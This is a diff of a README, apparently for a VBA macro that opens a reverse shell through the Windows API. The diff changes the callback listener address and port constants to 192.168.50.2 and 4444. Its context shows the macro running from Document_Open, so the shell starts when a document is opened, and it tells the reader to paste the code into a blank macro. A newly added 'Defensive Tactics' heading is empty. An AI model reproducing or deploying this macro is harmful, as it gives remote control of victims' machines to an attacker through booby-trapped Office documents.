@@ -4,8 +4,8 @@ Simple VBA to execute Windows API and open a remote shell
 # Code
 Copy & paste into blank macro
 ```
-Const ip = "192.168.43.1"   //Replace IP
-Const port = "1337"         //Replace Port
+Const ip = "192.168.50.2"   //Replace IP
+Const port = "4444"         //Replace Port
 
 Const INVALID_SOCKET = -1
 Const WSADESCRIPTION_LEN = 256
@@ -173,3 +173,5 @@ Private Sub Document_Open()
 End Sub
 
 ```
+# Defensive Tactics
+
